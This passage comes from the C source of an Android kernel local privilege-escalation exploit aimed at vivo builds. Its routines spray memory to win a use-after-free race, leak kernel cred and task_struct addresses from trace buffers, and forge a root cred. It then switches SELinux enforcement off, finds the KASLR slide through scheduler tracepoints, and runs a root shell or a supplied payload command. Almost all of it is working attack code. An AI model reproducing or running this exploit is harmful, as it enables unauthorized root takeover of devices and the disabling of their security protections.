    if (si.si_code != CLD_KILLED)
    {
        atomic_store(&g_stop_spray, 1);
        atomic_store(&g_burst2, 1);
        for (int i = 0; i < SPRAY_THREADS; i++)
            pthread_join(th[i], NULL);
        trace_stop();
        if (si.si_code == CLD_EXITED)
        {
            int st = 0;

            /* execve succeeded: no stale node, safe to reap and retry. */
            waitpid(T, &st, 0);
            kill_target_group(T);
            logf("[-] plant%d exec succeeded (status=%d); retryable\n",
                 tag, si.si_status);
            res->retry = 1;
            free(payload);
            return;
        }
        logf("[-] plant%d reap status not SIGKILL; holding zombie\n", tag);
        kill_target_group(T);
        g_held++;
        return;
    }
    atomic_store(&g_burst, 1);
    /*
     * Phase 1 is already spraying.  When the victim page is freed, release
     * phase 2 immediately; detecting the free before the allocation would
     * otherwise leave the page to the next caller.
     */
    long t1 = now_ms();
    int hit = 0;

    while (!hit && now_ms() - t1 < 15000)
    {
        for (int cpu = 0; cpu < 8 && !hit; cpu++)
        {
            long m = read_fd(g_rawfd[cpu], raw, 32u << 20);

            if (m <= 0)
                continue;
            if (scan_page_alloc_ours(raw, (size_t)m, slab_pfn))
            {
                hit = 1;
            }
            else if (!free_seen &&
                     scan_page_free(raw, (size_t)m, slab_pfn))
            {
                free_seen = 1;
                atomic_store(&g_burst2, 1);
            }
        }
        if (!free_seen && now_ms() - t1 > 5)
            atomic_store(&g_burst2, 1);
        if (!hit)
            usleep(50);
    }
    atomic_store(&g_stop_spray, 1);
    atomic_store(&g_burst2, 1);
    for (int i = 0; i < SPRAY_THREADS; i++)
        pthread_join(th[i], NULL);
    trace_stop();
    for (int cpu = 0; cpu < 8 && !hit; cpu++)
    {
        long m = read_fd(g_rawfd[cpu], raw, 32u << 20);

        if (m > 0 && scan_page_alloc_ours(raw, (size_t)m, slab_pfn))
            hit = 1;
    }
    logf("[+] plant%d free_seen=%d burst hit=%d after %ldms\n",
         tag, free_seen, hit, now_ms() - t1);
    if (!hit)
    {
        logf("[-] plant%d burst missed; holding zombie\n", tag);
        kill_target_group(T);
        g_held++;
        return;
    }

    usleep(1000);
    int st = 0;
    waitpid(T, &st, 0);
    kill_target_group(T);
    logf("[+] plant%d reaped status=%#x\n", tag, st);
    res->A = V + 0x78;
    res->ok = 1;
    logf("[+] plant%d write mode=%s target=%#llx\n", tag,
         mode == 2 ? "fake" : "zero", target);
    free(payload);
}

/*
 * The child execs this binary so that it owns a private real cred.  The exec
 * allocation is captured from the kmem trace; the child then blocks on fd 3
 * and reports readiness on fd 4.  On success it returns the cred address and
 * hands the pipe fds to the caller.
 */
static unsigned long long leak_cred(unsigned char *raw,
                                    pid_t *out_pid, int *out_go, int *out_st,
                                    int shell_mode,
                                    unsigned long long *task_out)
{
    for (int attempt = 0; attempt < 4; attempt++)
    {
        int go[2], st[2];
        pid_t p;
        long n;
        int c = 0, hello = 0, tc = 0;
        unsigned long long R = 0, site = 0, task = 0;

        if (pipe(go) || pipe(st))
            return 0;
        /*
         * Start tracing before fork so copy_process()'s task_struct
         * allocation is in the buffer.  The exec cred allocation follows.
         */
        trace_start();
        p = fork();
        if (p == 0)
        {
            int g2, s2;
            char ch;

            close(go[1]);
            close(st[0]);
            g2 = fcntl(go[0], F_DUPFD, 20);
            s2 = fcntl(st[1], F_DUPFD, 20);
            if (g2 < 0 || s2 < 0)
                _exit(125);
            close(go[0]);
            close(st[1]);
            dup2(g2, 3);
            close(g2);
            dup2(s2, 4);
            close(s2);
            pin(g_cpu);
            if (read(3, &ch, 1) != 1)
                _exit(126);
            {
                const char *cmode = g_full_shell ? "fullshell" :
                                     (shell_mode ? "shell" :
                                      (g_diag ? "diag" :
                                       (g_fake_stage ? "fake" : "verify")));
                char *const av[] = {(char *)"/proc/self/exe", (char *)"wait",
                                    (char *)cmode, NULL};
                char pcenv[1024];
                const char *pcg = getenv("PAYLOAD_CMD");
                char *const ep[] = {(char *)"PATH=/system/bin:/system/xbin",
                                    pcenv, NULL};
                char *const epk[] = {(char *)"PATH=/system/bin:/system/xbin",
                                     (char *)"IC_EXEC_PAYLOAD=1", pcenv, NULL};

                /* The child re-execs this binary with a custom environment,
                 * so PAYLOAD_CMD (safe mode + proof) has to be forwarded
                 * explicitly; IC_EXEC_PAYLOAD marks the ksu endgame. */
                snprintf(pcenv, sizeof(pcenv), "PAYLOAD_CMD=%s",
                         pcg && *pcg ? pcg : "");
                logf("[leak] child exec pid=%d uid=%d\n", getpid(),
                     getuid());
                execve("/proc/self/exe", av, g_exec_payload ? epk : ep);
                logf("[-] leak child exec failed errno=%d\n", errno);
            }
            _exit(127);
        }
        if (p < 0)
        {
            close(go[0]);
            close(go[1]);
            close(st[0]);
            close(st[1]);
            return 0;
        }
        close(go[0]);
        close(st[1]);
        if (write(go[1], "A", 1) != 1)
            logf("[!] leak go write failed\n");
        usleep(50000);
        trace_stop();
        n = read_cpu(g_cpu, raw, 48u << 20);
        if (n > 0)
        {
            c = scan_cred_allocs(raw, (size_t)n, (int)p, &site, &R);
            tc = scan_task_allocs(raw, (size_t)n, getpid(), &task);
        }
        if (R && (!g_fake_stage || task))
        {
            struct pollfd pf = {.fd = st[0], .events = POLLIN};

            if (poll(&pf, 1, 2000) > 0 &&
                read(st[0], &hello, sizeof(hello)) == sizeof(hello) &&
                hello == CHILD_HELLO)
            {
                logf("[cred] attempt=%d child=%d R=%#llx site_low=%#llx "
                     "recs=%d task=%#llx task_recs=%d\n",
                     attempt, p, R, site & 0x1fffff, c, task, tc);
                *out_pid = p;
                *out_go = go[1];
                *out_st = st[0];
                *task_out = task;
                return R;
            }
        }
        logf("[cred] attempt=%d child=%d R=%#llx hello=%#x recs=%d "
             "task=%#llx task_recs=%d failed\n",
             attempt, p, R, hello, c, task, tc);
        close(go[1]);
        close(st[0]);
        kill(p, SIGKILL);
        waitpid(p, NULL, 0);
    }
    return 0;
}

static int wait_child_main(const char *mode)
{
    struct child_report rep;
    char ch;
    int hello = CHILD_HELLO;

    logf("[wait] entry mode=%s pid=%d\n", mode, getpid());
    pin(g_cpu);
    {
        ssize_t hr;

        errno = 0;
        hr = write(4, &hello, sizeof(hello));
        logf("[wait] hello write=%zd errno=%d\n", hr, errno);
        if (hr != (ssize_t)sizeof(hello))
            _exit(130);
    }
    {
        /* Fake-cred modes: the parent cannot observe task->cred through
         * /proc (status reports real_cred), so it peeks at the child's own
         * view instead.  Every wake reports getuid/geteuid and the child
         * only proceeds to the rest of this function on 'G'. */
        int peek = !strcmp(mode, "fake") || !strcmp(mode, "diag") ||
                   !strcmp(mode, "fullshell");

        for (;;)
        {
            if (read(3, &ch, 1) != 1)
                _exit(131);
            if (!peek)
                break;
            {
                int st[2];

                st[0] = (int)syscall(SYS_getuid);
                st[1] = (int)syscall(SYS_geteuid);
                if (write(4, st, sizeof(st)) != sizeof(st))
                    _exit(132);
            }
            if (ch == 'G')
                break;
        }
    }
    close(3);

    memset(&rep, 0, sizeof(rep));
    rep.magic = CHILD_MAGIC;
    rep.uid = (int)syscall(SYS_getuid);
    rep.euid = (int)syscall(SYS_geteuid);
    logf("[child] woke uid=%d euid=%d\n", rep.uid, rep.euid);
    if (rep.uid != 0)
    {
        rep.setuid_ret = -1;
        /* The parent's gate reads setuid_ret/reuid, so fill in what was
         * actually observed instead of leaving the memset zeros there: a
         * report of "uid=0, euid=2000, setuid=0, reuid=0" would otherwise
         * look like success. */
        rep.reuid = (int)syscall(SYS_geteuid);
        (void)write(4, &rep, sizeof(rep));
        close(4);
        logf("[-] child uid is not 0: cred write did not land\n");
        _exit(3);
    }

    if (!strcmp(mode, "fake") || !strcmp(mode, "diag") ||
        !strcmp(mode, "fullshell"))
    {
        char *const envp[] = {
            (char *)"PATH=/system/bin:/system/xbin:/sbin:/vendor/bin",
            (char *)"HOME=/", (char *)"TMPDIR=/data/local/tmp",
            (char *)"ANDROID_DATA=/data", (char *)"ANDROID_ROOT=/system",
            NULL};
        int st = 0;
        pid_t w;
        int fl = 0;
        int ef = 0;
        logf("[childdiag] uid=%d euid=%d\n", rep.uid, rep.euid);
        {
            int sf = open("/sys/fs/selinux/enforce", O_WRONLY);

            logf("[childdiag] open_enforce fd=%d errno=%d\n", sf, sf < 0 ? errno : 0);
            if (sf >= 0)
            {
                ssize_t sn = write(sf, "0", 1);

                logf("[childdiag] write_enforce=%zd errno=%d\n", sn, sn < 0 ? errno : 0);
                if (sn == 1)
                    fl |= 1;
                close(sf);
            }
            else
                ef = errno & 0x3f;
        }
        errno = 0;
        {
            ssize_t rw = write(4, &rep, sizeof(rep));
            int re = errno;

            logf("[childdiag] write_report=%zd errno=%d\n", rw, re);
            if (rw == (ssize_t)sizeof(rep))
                fl |= 2;
        }
        close(4);
        logf("[fake] child uid=%d euid=%d; forking worker\n",
             rep.uid, rep.euid);
        errno = 0;
        w = fork();
        logf("[fake] worker fork w=%d errno=%d\n", (int)w, errno);
        /* Small-RAM devices exhaust the page cache with the spray before the
         * handoff; copy_process then fails with ENOMEM.  We are a full-cap
         * root here, so drop caches and retry a couple of times. */
        for (int ftry = 0; w < 0 && errno == ENOMEM && ftry < 3; ftry++)
        {
            int dc = open("/proc/sys/vm/drop_caches", O_WRONLY);

            if (dc >= 0)
            {
                (void)!write(dc, "1", 1);
                close(dc);
            }
            usleep(300000);
            errno = 0;
            w = fork();
            logf("[fake] worker fork retry %d -> w=%d errno=%d\n", ftry + 1,
                 (int)w, errno);
        }
        if (w < 0)
        {
            /* copy_process can fail on a forged cred (ucounts/RLIMIT_NPROC
             * accounting).  Fall through to exec the payload directly: with
             * SELinux permissive the exec still normalizes the cred. */
            const char *pc = getenv("PAYLOAD_CMD");

            if (pc && *pc)
            {
                char *const pv[] = {(char *)"sh", (char *)"-c", (char *)pc,
                                    NULL};

                logf("[fake] fork failed; exec payload directly\n");
                execve("/system/bin/sh", pv, envp);
                logf("[-] direct payload exec failed errno=%d\n", errno);
            }
            _exit(0x40 | fl | ef);
        }
        if (w == 0)
        {
            if (!strcmp(mode, "fullshell"))
            {
                char *const av[] = {(char *)"sh", (char *)"-i", NULL};

                logf("[fullshell] uid=%d euid=%d; exec sh -i with fake-cred caps\n",
                     getuid(), geteuid());
                errno = 0;
                execve("/system/bin/sh", av, envp);
                logf("[-] fullshell exec failed errno=%d\n", errno);
                _exit(127);
            }

            const char *pc = getenv("PAYLOAD_CMD");

            if (getenv("IC_EXEC_PAYLOAD") && pc && *pc)
            {
                char *const pv[] = {(char *)"sh", (char *)"-c", (char *)pc,
                                    NULL};

                logf("[ksu] exec payload uid=%d euid=%d\n", getuid(),
                     geteuid());
                errno = 0;
                execve("/system/bin/sh", pv, envp);
                logf("[-] payload exec failed errno=%d\n", errno);
                _exit(127);
            }
            char *const av[] = {(char *)"sh",
                                (char *)"/data/local/tmp/ksu_stage.sh", NULL};

            errno = 0;
            execve("/system/bin/sh", av, envp);
            {
                int exec_errno = errno;
                int script_access = access("/data/local/tmp/ksu_stage.sh", X_OK);
                int script_errno = script_access < 0 ? errno : 0;

                logf("[childdiag] worker_exec errno=%d script_access=%d script_errno=%d\n",
                     exec_errno, script_access, script_errno);
                errno = exec_errno;
            }
            _exit(127);
        }
        if (w > 0)
            waitpid(w, &st, 0);
        logf("[fake] worker exit=%#x flags=%d errno=%d\n", st, fl, ef);
        _exit(0x40 | fl | ef | ((st & 0xff) << 8));
    }

    /*
     * Plant 1 zeroes uid+gid only; egid is still 2000.  If it stays that way
     * across execve(), cap_bprm's setgid downgrade intersects permitted with
     * the old (empty) set and the expanded bset never becomes effective.
     */
    errno = 0;
    {
        long sg = syscall(SYS_setresgid, 0, 0, 0);

        logf("[child] setresgid(0)=%ld errno=%d\n", sg, errno);
    }
    errno = 0;
    rep.setuid_ret = (int)syscall(SYS_setuid, 0);
    rep.setuid_errno = errno;
    {
        uid_t ru = 0, eu = 0, su = 0;

        getresuid(&ru, &eu, &su);
        rep.ruid = (int)ru;
        rep.reuid = (int)eu;
        rep.rsuid = (int)su;
    }
    (void)write(4, &rep, sizeof(rep));
    close(4);
    logf("[child] setuid(0)=%d errno=%d resuid=%d/%d/%d\n",
         rep.setuid_ret, rep.setuid_errno, rep.ruid, rep.reuid, rep.rsuid);
    if (rep.setuid_ret != 0)
    {
        logf("[-] setuid(0) failed; not running a shell\n");
        _exit(4);
    }

    {
        char *const envp[] = {
            (char *)"PATH=/system/bin:/system/xbin:/sbin:/vendor/bin",
            (char *)"HOME=/", (char *)"TMPDIR=/data/local/tmp",
            (char *)"ANDROID_DATA=/data", (char *)"ANDROID_ROOT=/system",
            NULL};

        /* The App passes its payload command through PAYLOAD_CMD even
         * without a KSU manager (proof command, or "sh safemode.sh ; cmd"
         * when 安全模式 is checked).  Run it here instead of the hardcoded
         * proof so safe mode works in the shell path too. */
        {
            const char *pc = getenv("PAYLOAD_CMD");

            if (pc && *pc)
            {
                char *const pv[] = {(char *)"sh", (char *)"-c",
                                    (char *)pc, NULL};

                logf("[shell] exec payload uid=%d euid=%d\n", getuid(),
                     geteuid());
                errno = 0;
                execve("/system/bin/sh", pv, envp);
                logf("[-] payload exec failed errno=%d\n", errno);
            }
        }
        if (!strcmp(mode, "shell"))
        {
            char *const av[] = {(char *)"sh", (char *)"-i", NULL};

            execve("/system/bin/sh", av, envp);
        }
        else
        {
            char *const av[] = {(char *)"sh", (char *)"-c",
                                (char *)"id; cat /proc/self/attr/current 2>/dev/null; "
                                        "echo ROOT_SHELL_OK",
                                NULL};

            execve("/system/bin/sh", av, envp);
        }
    }
    logf("[-] shell exec failed errno=%d\n", errno);
    _exit(5);
}


/* 安全探测：只 fork/创建定时器并读 trace，打印真实分配调用点，不触发 UAF */
static void dump_sites(void)
{
    unsigned char *raw = malloc(48u << 20);
    if (!raw) { logf("[-] alloc failed\n"); return; }
    enable_events();
    kick_rss();
    usleep(50000);
    if (discover_page_types(raw) != 0) { logf("[-] discover failed\n"); return; }
    logf("[sites] page_alloc=%d page_free=%d\n", g_t_page_alloc, g_t_page_free);
    prefill_timers(64);
    trace_start();
    pid_t p = fork();
    if (p == 0) {
        for (int i = 0; i < 64; i++) {
            timer_t t;
            timer_create(CLOCK_PROCESS_CPUTIME_ID, NULL, &t);
        }
        _exit(0);
    }
    waitpid(p, NULL, 0);
    trace_stop();
    long n = read_cpu(g_cpu, raw, 48u << 20);
    logf("[sites] trace bytes=%ld\n", n);
    int nt = 0, nk = 0;
    if (n > 0) {
        for (size_t i = 8; i + 32 <= (size_t)n; i += 4) {
            unsigned long long site = u64(raw, i);
            unsigned long long ptr = u64(raw, i + 8);
            unsigned long long req = u64(raw, i + 16);
            unsigned long long alc = u64(raw, i + 24);
            if (!is_kernel_ptr(ptr) || !is_kernel_ptr(site))
                continue;
            if (req == TIMER_ALLOC && alc == TIMER_ALLOC && nt < 6) {
                logf("[site] timer low=%#llx addr=%#llx\n", site & 0x1fffff, ptr);
                nt++;
            } else if (nk < 60 && req > 0) {
                logf("[rec] low=%#llx req=%#llx alloc=%#llx ptr=%#llx\n",
                     site & 0x1fffff, req, alc, ptr);
                nk++;
            }
        }
    }
    free(raw);
}

/* ---- anchor slide -------------------------------------------------------
 *
 * vivo masks /proc/kallsyms, so the KASLR slide has to be measured from the
 * trace instead.  sched_blocked_reason names the function each blocked task
 * blocked in; park tasks in syscalls whose call sites are in the per-build
 * anchor table, then match the raw ring's kernel text pointers against
 * (anchor_link + offset-from-text-trace).  Ported from the 0.11 tool, whose
 * tables are reused verbatim in anchors.h (generated by
 * core/tools/gen_anchors.py; the 16.2.11 entry comes from the Image).
 */
#include "anchors.h"

/* External symbol table (the old tool's `ic-timer syms boot.img`, or the
 * PC-side tool/parse_offsets.py).  Only the plan symbols matter: the slide
 * comes from the timer call site, so a table generated for any build is
 * directly usable without the anchor vote.  Format: "name=0xADDR" lines. */
static int read_syms_file(const char *path)
{
    FILE *f = fopen(path, "r");
    char line[256];
    int n = 0;

    if (!f)
        return 0;
    while (fgets(line, sizeof(line), f))
    {
        char name[128];
        unsigned long long v;

        if (sscanf(line, "%127[^=]=0x%llx", name, &v) != 2 || !v)
            continue;
        if (!strcmp(name, "__tracepoint_sys_exit"))
        {
            if (!g_tp_link)
            {
                g_tp_link = v;
                n++;
            }
        }
        else if (!strcmp(name, "selinux_state"))
        {
            if (!g_selinux_link)
            {
                g_selinux_link = v;
                n++;
            }
        }
        else if (!strcmp(name, "root_user"))
        {
            if (!g_root_user_link)
            {
                g_root_user_link = v;
                n++;
            }
        }
        else if (!strcmp(name, "init_user_ns"))
        {
            if (!g_init_user_ns_link)
            {
                g_init_user_ns_link = v;
                n++;
            }
        }
        else if (!strcmp(name, "init_ucounts"))
        {
            if (!g_init_ucounts_link)
            {
                g_init_ucounts_link = v;
                n++;
            }
        }
        else if (!strcmp(name, "init_groups"))
        {
            if (!g_init_groups_link)
            {
                g_init_groups_link = v;
                n++;
            }
        }
        else if (!strcmp(name, "init_cred"))
        {
            if (!g_init_cred_link)
            {
                g_init_cred_link = v;
                n++;
            }
        }
    }
    fclose(f);
    return n;
}

static void read_build_id(char *out, size_t cap)
{
    out[0] = 0;
#if defined(__ANDROID__)
    if (!__system_property_get("ro.build.display.id", out))
        out[0] = 0;
#endif
    if (out[0])
        return;
    {
        FILE *f = fopen("/system/build.prop", "r");
        char line[256];

        if (!f)
            return;
        while (fgets(line, sizeof(line), f))
        {
            if (!strncmp(line, "ro.build.display.id=", 20))
            {
                char *nl;

                snprintf(out, cap, "%s", line + 20);
                nl = strchr(out, '\n');
                if (nl)
                    *nl = 0;
                break;
            }
        }
        fclose(f);
    }
}

static int model_match(const char *models, const char *build)
{
    const char *p = models;

    if (!models || !*models)
        return 1;
    while (p && *p)
    {
        const char *q = strchr(p, '|');
        size_t n = q ? (size_t)(q - p) : strlen(p);
        char tok[64];

        if (n < sizeof(tok))
        {
            memcpy(tok, p, n);
            tok[n] = 0;
            if (*tok && build && strstr(build, tok))
                return 1;
        }
        p = q ? q + 1 : NULL;
    }
    return 0;
}

static const struct ic_anchor_build *anchor_pick(const char *build)
{
    size_t i;

    for (i = 0; i < sizeof(ic_anchor_builds) / sizeof(ic_anchor_builds[0]); i++)
    {
        const struct ic_anchor_build *t = &ic_anchor_builds[i];

        if (t->kernel && *t->kernel)
        {
            struct utsname un;

            if (uname(&un) == 0 && !strstr(un.release, t->kernel))
                continue;
        }
        if (build && *build)
        {
            if (t->version && *t->version && !strstr(build, t->version))
                continue;
            if (!model_match(t->models, build))
                continue;
        }
        /* Unknown build id (initramfs, offline runs): fall back to the
         * kernel match; the anchor vote still has to succeed on its own. */
        return t;
    }
    return NULL;
}

static int anchor_index(const char *name)
{
    int i;

    for (i = 0; i < IC_ANCHOR_N - 4; i++)
        if (!strcmp(ic_anchor_names[i], name))
            return i;
    return -1;
}

static unsigned long long slide_from_anchors(const struct ic_anchor_build *tab,
                                             unsigned char *raw, size_t rawcap,
                                             char *text, size_t textcap)
{
    pid_t kids[10];
    int nk = 0, i, j;
    unsigned long long ln[128];
    int lnidx[128];
    int nl = 0, ncall = 0;
    unsigned long long vals[4096];
    int nv = 0;
    unsigned long long best = 0;
    unsigned cnt = 0;
    int ns = 0;

    {
        int e1 = wr(TR "/tracing_on", "0");
        int e2 = wr(TR "/events/sched/sched_blocked_reason/enable", "1");

        wr(TR "/trace", "\n");
        wr(TR "/tracing_on", "1");
        logf("[slide] blocked_reason enable=%d/%d\n", e1, e2);
    }

    for (i = 0; i < 8; i++)
    {
        pid_t p = fork();

        if (p < 0)
            break;
        if (p == 0)
        {
            if (i < 3)
            {
                int pp[2];
                char c;

                if (!pipe(pp))
                {
                    close(pp[1]);
                    (void)!read(pp[0], &c, 1);
                }
            }
            else if (i < 5)
                (void)poll(NULL, 0, 5000);
            else if (i < 7)
            {
                int e = (int)syscall(SYS_epoll_create1, 0);

                if (e >= 0)
                {
                    struct
                    {
                        uint32_t events;
                        uint64_t data;
                    } ev;

                    (void)syscall(SYS_epoll_pwait, e, &ev, 1, 5000, NULL);
                }
            }
            else
            {
                int sp[2];
                char c;

                if (!socketpair(AF_UNIX, SOCK_STREAM, 0, sp))
                    (void)!read(sp[0], &c, 1);
            }
            _exit(0);
        }
        kids[nk++] = p;
    }
    for (i = 0; i < 6; i++)
    {
        int fd;

        usleep(150000);
        fd = open("/system/build.prop", O_RDONLY | O_CLOEXEC);
        if (fd >= 0)
        {
            char b[4096];

            (void)!read(fd, b, sizeof(b));
            close(fd);
        }
    }
    for (i = 0; i < nk; i++)
    {
        kill(kids[i], SIGKILL);
        waitpid(kids[i], NULL, 0);
    }
    wr(TR "/tracing_on", "0");
    wr(TR "/events/sched/sched_blocked_reason/enable", "0");

    {
        int fd = open(TR "/trace", O_RDONLY | O_CLOEXEC);
        ssize_t n = fd >= 0 ? read(fd, text, textcap - 1) : -1;

        if (fd >= 0)
            close(fd);
        logf("[slide] text=%zd\n", n);
        if (n > 0)
            logf("[slide] head=%.300s\n", text);
        if (n <= 0)
            return 0;
        text[n] = 0;
        {
            const char *s = text, *e = text + n;

            while (s < e)
            {
                const char *q = memmem(s, (size_t)(e - s), "caller=", 7);
                char name[96];
                int k = 0, idx;
                unsigned long off;

                if (!q)
                    break;
                ncall++;
                q += 7;
                while (q < e && k < 95 && *q != '+' && *q != '/' &&
                       *q != ' ' && *q != '\n')
                    name[k++] = *q++;
                name[k] = 0;
                if (q + 3 < e && q[0] == '+' && q[1] == '0' && q[2] == 'x')
                {
                    off = (unsigned long)strtoul(q + 3, NULL, 16);
                    idx = anchor_index(name);
                    if (idx >= 0 && nl < 128)
                    {
                        unsigned long long v = tab->link[idx] + off;
                        int dup = 0;

                        for (j = 0; j < nl; j++)
                            if (ln[j] == v)
                                dup = 1;
                        if (!dup)
                        {
                            ln[nl] = v;
                            lnidx[nl] = idx;
                            nl++;
                        }
                    }
                }
                s = q;
            }
        }
    }
    logf("[slide] callers=%d matched=%d\n", ncall, nl);
    if (!nl)
        return 0;

    for (i = 0; i < 8 && nv < 4096; i++)
    {
        long n = read_cpu(i, raw, rawcap / 8);
        long k;

        for (k = 0; k + 8 <= n && nv < 4096; k += 8)
        {
            unsigned long long v;
            int dup = 0, m;

            memcpy(&v, raw + k, 8);
            if (!is_kernel_ptr(v))
                continue;
            for (m = 0; m < nv; m++)
                if (vals[m] == v)
                {
                    dup = 1;
                    break;
                }
            if (!dup)
                vals[nv++] = v;
        }
    }

    {
        static struct
        {
            unsigned long long key;
            unsigned cnt;
        } tabh[4096];
        int k2;

        memset(tabh, 0, sizeof(tabh));
        for (i = 0; i < nv; i++)
            for (j = 0; j < nl; j++)
            {
                unsigned long long sl = vals[i] - ln[j];
                unsigned h;

                if ((sl & 0x1fffffULL) || sl >= 0x8000000000ULL)
                    continue;
                h = (unsigned)((sl >> 21) & 4095);
                for (k2 = 0; k2 < 16; k2++, h = (h + 1) & 4095)
                {
                    if (!tabh[h].cnt)
                    {
                        tabh[h].key = sl;
                        tabh[h].cnt = 1;
                        break;
                    }
                    if (tabh[h].key == sl)
                    {
                        tabh[h].cnt++;
                        break;
                    }
                }
            }
        for (i = 0; i < 4096; i++)
            if (tabh[i].cnt > cnt)
            {
                cnt = tabh[i].cnt;
                best = tabh[i].key;
            }
    }

    {
        int seen[128];

        for (i = 0; i < nv; i++)
            for (j = 0; j < nl; j++)
                if (best && vals[i] - ln[j] == best)
                {
                    int d = 0, k3;

                    for (k3 = 0; k3 < ns; k3++)
                        if (seen[k3] == lnidx[j])
                            d = 1;
                    if (!d && ns < 128)
                        seen[ns++] = lnidx[j];
                }
    }

    logf("[slide] table=%s anchors=%d values=%d best=%#llx votes=%u supported=%d\n",
         tab->name, nl, nv, best, cnt, ns);
    if (cnt >= 8 && ns >= 2)
        return best;
    return 0;
}

int main(int argc, char **argv)
{
    unsigned char *raw;
    int shell_mode = 0, leak_only = 0, ids_only = 0;

    setvbuf(stdout, NULL, _IONBF, 0);
    logf("[main] up pid=%d argc=%d a1=%s\n", getpid(), argc,
         argc > 1 ? argv[1] : "-");
    /* Offline harness channel.  The initrd's init mknods /dev/ic-out as a
     * clone of the console and labels it null_device, which the shell domain
     * may write even while the policy is enforced; redirect both stdio
     * streams there when it exists so the run stays observable.  Absent on
     * the device, where the caller already wired up our stdio. */
    {
        const char *lp = getenv("IC_LOG_PATH");
        int lfd = lp && *lp ? open(lp, O_WRONLY | O_APPEND | O_CLOEXEC) :
                              open("/dev/ic-out", O_WRONLY | O_APPEND | O_CLOEXEC);

        if (lfd >= 0)
        {
            (void)dup2(lfd, 1);
            (void)dup2(lfd, 2);
            if (lfd > 2)
                close(lfd);
        }
    }
    {
        int sr = setsid();

        logf("[main] setsid rc=%d errno=%d\n", sr, errno);
    }

    if (argc > 1 && !strcmp(argv[1], "wait"))
        return wait_child_main(argc > 2 ? argv[2] : "verify");
    signal(SIGHUP, SIG_IGN);
    signal(SIGINT, SIG_IGN);
    signal(SIGTERM, SIG_IGN);
    signal(SIGPIPE, SIG_IGN);

    /* Refuse to run a profile against a kernel it was not derived from.
     * A mismatch normally fails harmlessly at the timer-call-site match,
     * but a wrong slide would make every write land somewhere random. */
    {
        const char *allow = getenv("IC_ALLOW_ANY_KERNEL");
        struct utsname un;

        if (!allow && uname(&un) == 0 &&
            !strstr(un.release, PROFILE_KERNEL_MATCH))
        {
            logf("[-] kernel %s does not match profile %s (need %s);\n"
                 "    set IC_ALLOW_ANY_KERNEL=1 to override\n",
                 un.release, IC_PROFILE_NAME, PROFILE_KERNEL_MATCH);
            return 1;
        }
    }

    read_kallsyms();
    if (g_text_runtime)
    {
        unsigned long long sl = g_text_runtime - 0xffffffc008000000ULL;

        if (!(sl & 0x1fffffULL) && sl < 0x8000000000ULL)
        {
            g_slide = sl;
            logf("[ksym] slide=%#llx from _text\n", sl);
        }
        else
            logf("[ksym] implausible _text slide %#llx; ignoring\n", sl);
    }
    /* `core syms <image> [out]` -- parse a boot.img / Image / vmlinux /
     * System.map into the external table the de-tag path reads.  This is the
     * old tool's on-device "parse offsets" flow, ported with ic_syms.c. */
    if (argc > 1 && !strcmp(argv[1], "syms"))
    {
        const char *in = argc > 2 ? argv[2] : NULL;
        const char *out = argc > 3 ? argv[3] : "/data/local/tmp/ic-syms.txt";

        if (!in)
        {
            logf("usage: %s syms <boot.img|Image|vmlinux|System.map> [out]\n",
                 argv[0]);
            return 2;
        }
        return ic_syms_parse_file(in, out, 1) == 0 ? 0 : 1;
    }

    if (argc > 1 && !strcmp(argv[1], "shell"))
    {
        shell_mode = 1;
        g_full_shell = 1;
        g_fake_stage = 1;
    }
    if (argc > 1 && !strcmp(argv[1], "ksu"))
    {
        /* KSU handoff: run the fake-cred endgame and, once the child holds
         * the full-capability cred, exec the App-provided payload command
         * (its ksu_handoff.sh + proof) instead of an interactive shell. */
        g_fake_stage = 1;
        g_exec_payload = 1;
        (void)setenv("IC_EXEC_PAYLOAD", "1", 1);
    }
    if (argc > 1 && !strcmp(argv[1], "sites")) {
        setvbuf(stdout, NULL, _IONBF, 0);
        pin(g_cpu);
    logf("[+] pid=%d cpu=%d\n", getpid(), g_cpu);
        dump_sites();
        return 0;
    }
    if (argc > 1 && !strcmp(argv[1], "leak"))
        leak_only = 1;
    if (argc > 1 && !strcmp(argv[1], "ids"))
        ids_only = 1;
    if (argc > 1 && !strcmp(argv[1], "diag"))
    {
        g_fake_stage = 1;
        g_diag = 1;
    }
    if (argc > 1 && !strcmp(argv[1], "fake"))
        g_fake_stage = 1;

    raw = malloc(48u << 20);
    if (!raw)
        return 1;

    /* No kallsyms: recover the slide (and the de-tag address) from the
     * per-build anchor table by parking tasks and voting on the trace. */
    if (getenv("IC_FORCE_ANCHORS") ||
        (argc > 1 && !strcmp(argv[1], "anchors")))
    {
        /* Force the anchor vote (offline checks): hide what
         * kallsyms gave us so the vote must stand on its own. */
        g_text_runtime = g_tp_runtime = g_selinux_runtime = 0;
    }
    if (!g_tp_runtime && !g_text_runtime)
    {
        char bid[160];
        const struct ic_anchor_build *tab;

        read_build_id(bid, sizeof(bid));
        tab = anchor_pick(bid);
        logf("[anchors] build=%s table=%s\n", bid[0] ? bid : "?",
             tab ? tab->name : "none");
        if (tab)
        {
            /* The slide itself comes from the timer call site (see
             * run_plant): only the table's link-time addresses are needed
             * here.  The anchor vote is kept for experiments because
             * sched_blocked_reason is gated by schedstats and does not fire
             * on every build. */
            if (!g_tp_link)
            {
                g_tp_link = tab->link[IC_ANCHOR_N - 4];
                g_selinux_link = tab->link[IC_ANCHOR_N - 3];
                if (!g_init_user_ns_link)
                    g_init_user_ns_link = tab->link[IC_ANCHOR_N - 2];
                /* The fake-cred objects live at fixed offsets from
                 * init_user_ns in every build we could verify against an
                 * image (16.1.11.0, 16.2.11, 16.2.12.0, 16.2.20.7/21.1):
                 *   root_user    = ns + 0x298
                 *   init_ucounts = ns + 0x1b48
                 *   init_groups  = ns + 0x15b8
                 * Every anchor table carries init_user_ns, so this covers
                 * builds we never had an image for (deriving a wrong value
                 * only makes prepare_creds fail with ENOMEM, not panic). */
                if (!g_root_user_link && g_init_user_ns_link)
                    g_root_user_link = g_init_user_ns_link + 0x298;
                if (!g_init_ucounts_link && g_init_user_ns_link)
                    g_init_ucounts_link = g_init_user_ns_link + 0x1b48;
                if (!g_init_groups_link && g_init_user_ns_link)
                    g_init_groups_link = g_init_user_ns_link + 0x15b8;
                if (!g_init_cred_link)
                    g_init_cred_link = tab->link[IC_ANCHOR_N - 1];
                /* Fill the fake-cred objects the anchor tables lack, when
                 * this build's image was available offline. */
                {
                    size_t ei;

                    for (ei = 0; ei < sizeof(ic_extra_syms_tab) /
                                        sizeof(ic_extra_syms_tab[0]);
                         ei++)
                    {
                        const struct ic_extra_syms *xs =
                            &ic_extra_syms_tab[ei];

                        if (strcmp(xs->table, tab->name))
                            continue;
